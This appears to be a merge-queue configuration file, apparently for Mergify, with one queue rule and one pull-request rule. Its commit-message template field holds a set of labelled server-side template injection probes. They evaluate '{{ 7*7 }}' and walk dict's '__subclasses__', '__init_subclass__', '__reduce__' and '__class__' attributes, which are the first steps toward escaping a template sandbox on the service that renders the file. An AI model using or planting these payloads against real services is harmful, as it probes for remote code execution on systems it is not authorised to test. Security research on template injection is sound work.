queue_rules:
  - name: default
    queue_conditions: []
    merge_conditions: []
    merge_method: squash
    commit_message_template: |
      SSTI: {{ 7*7 }}
      SC_ON_DICT: {{ [dict]|map(attribute="__subclasses__")|list }}
      INITSUB_DICT: {{ [dict]|map(attribute="__init_subclass__")|list }}
      REDUCE_DICT: {{ [dict]|map(attribute="__reduce__")|list }}
      DIR_CLASS: {{ dict['__class__'] }}
pull_request_rules:
  - name: q
    conditions:
      - base=master
    actions:
      comment:
        message: q